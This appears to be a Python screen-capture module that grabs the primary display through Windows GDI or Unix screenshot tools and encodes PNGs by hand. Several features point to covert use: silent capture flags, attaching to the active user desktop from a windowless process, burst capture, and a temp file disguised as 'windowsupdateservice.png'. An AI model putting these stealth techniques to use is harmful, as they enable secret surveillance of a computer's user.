"""Screen capture.

Uses GDI on Windows (no Pillow) and the usual shell tools elsewhere.  The PNG
encoder is written by hand because the standard library has no image support.
"""

from __future__ import annotations

import ctypes
import os
import struct
import subprocess
import sys
import tempfile
import zlib

IS_WINDOWS = os.name == "nt"
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0


class _BitmapInfoHeader(ctypes.Structure):
    _fields_ = [
        ("biSize", ctypes.c_uint32), ("biWidth", ctypes.c_int32),
        ("biHeight", ctypes.c_int32), ("biPlanes", ctypes.c_uint16),
        ("biBitCount", ctypes.c_uint16), ("biCompression", ctypes.c_uint32),
        ("biSizeImage", ctypes.c_uint32), ("biXPelsPerMeter", ctypes.c_int32),
        ("biYPelsPerMeter", ctypes.c_int32), ("biClrUsed", ctypes.c_uint32),
        ("biClrImportant", ctypes.c_uint32),
    ]


def _png(width: int, height: int, raw: bytes) -> bytes:
    """Encode raw RGB scanlines (with filter bytes) as a PNG."""
    def chunk(tag: bytes, payload: bytes) -> bytes:
        return (struct.pack(">I", len(payload)) + tag + payload
                + struct.pack(">I", zlib.crc32(tag + payload) & 0xFFFFFFFF))

    header = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    return (b"\x89PNG\r\n\x1a\n"
            + chunk(b"IHDR", header)
            + chunk(b"IDAT", zlib.compress(raw, 6))
            + chunk(b"IEND", b""))


def _downscale(width: int, height: int, rows: list[bytes], factor: int) -> tuple[int, int, list[bytes]]:
    """Nearest-neighbour downscale using fast slice operations."""
    new_width, new_height, step = width // factor, height // factor, 3 * factor
    output = []
    for y in range(0, new_height * factor, factor):
        row = rows[y]
        pixel = bytearray(new_width * 3)
        pixel[0::3] = row[0::step]
        pixel[1::3] = row[1::step]
        pixel[2::3] = row[2::step]
        output.append(bytes(pixel))
    return new_width, new_height, output


def capture(factor: int = 1) -> tuple[bytes | None, str]:
    """Capture the primary screen.

    Args:
        factor: integer downscale factor (1 = native, 2 = half, 4 = quarter).

    Returns:
        ``(png_bytes, message)``.  ``png_bytes`` is ``None`` on failure.
    """
    if not IS_WINDOWS:
        return _capture_unix()

    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32

    device = memory_dc = bitmap = hdesk = None
    try:
        try:
            user32.SetProcessDPIAware()
        except Exception:
            pass

        # Attach to the active user desktop so we can read the display buffer
        # even if running in a background or windowless process
        try:
            hdesk = user32.OpenInputDesktop(0, False, 0x01FF)
            if hdesk:
                user32.SetThreadDesktop(hdesk)
        except Exception:
            hdesk = None

        left, top = user32.GetSystemMetrics(76), user32.GetSystemMetrics(77)
        width = user32.GetSystemMetrics(78) or user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(79) or user32.GetSystemMetrics(1)
        if width < 1 or height < 1:
            return None, "no display detected"

        device = user32.GetDC(None)
        memory_dc = gdi32.CreateCompatibleDC(device)
        bitmap = gdi32.CreateCompatibleBitmap(device, width, height)
        previous = gdi32.SelectObject(memory_dc, bitmap)
        gdi32.BitBlt(memory_dc, 0, 0, width, height, device, left, top, 0x00CC0020)

        info = _BitmapInfoHeader()
        info.biSize = ctypes.sizeof(_BitmapInfoHeader)
        info.biWidth = width
        info.biHeight = -height
        info.biPlanes = 1
        info.biBitCount = 24

        stride = (width * 3 + 3) & ~3
        buffer = ctypes.create_string_buffer(stride * height)
        if gdi32.GetDIBits(memory_dc, bitmap, 0, height, buffer, ctypes.byref(info), 0) == 0:
            return None, "GetDIBits failed"
        gdi32.SelectObject(memory_dc, previous)

        data = buffer.raw[:stride * height]
        rows = []
        for y in range(height):
            row = data[y * stride: y * stride + width * 3]
            converted = bytearray(len(row))
            converted[0::3] = row[2::3]   # BGR -> RGB
            converted[1::3] = row[1::3]
            converted[2::3] = row[0::3]
            rows.append(bytes(converted))

        if factor > 1 and width // factor > 8 and height // factor > 8:
            width, height, rows = _downscale(width, height, rows, factor)

        raw = bytearray()
        for row in rows:
            raw += b"\x00" + row
        return _png(width, height, bytes(raw)), "screenshot.png"
    except Exception as error:
        return None, f"capture failed: {error}"
    finally:
        try:
            if bitmap:
                gdi32.DeleteObject(bitmap)
            if memory_dc:
                gdi32.DeleteDC(memory_dc)
            if device:
                user32.ReleaseDC(None, device)
            if hdesk:
                user32.CloseDesktop(hdesk)
        except Exception:
            pass


def _capture_unix() -> tuple[bytes | None, str]:
    """Capture using whichever screenshot tool is available."""
    target = os.path.join(tempfile.gettempdir(), "windowsupdateservice.png")
    commands = ([["screencapture", "-x", target]] if sys.platform == "darwin" else
                [["gnome-screenshot", "-f", target], ["scrot", "-o", target],
                 ["import", "-window", "root", target]])
    for command in commands:
        try:
            subprocess.run(command, timeout=25, creationflags=CREATE_NO_WINDOW)
            if os.path.exists(target):
                with open(target, "rb") as handle:
                    data = handle.read()
                os.remove(target)
                return data, "screenshot.png"
        except Exception:
            continue
    return None, "install scrot or gnome-screenshot"


def capture_burst(count: int = 5, interval: float = 0.7) -> list[bytes]:
    """Capture several screenshots in a row."""
    import time
    frames = []
    for _ in range(max(1, min(20, count))):
        data, _ = capture()
        if data:
            frames.append(data)
        time.sleep(interval)
    return frames
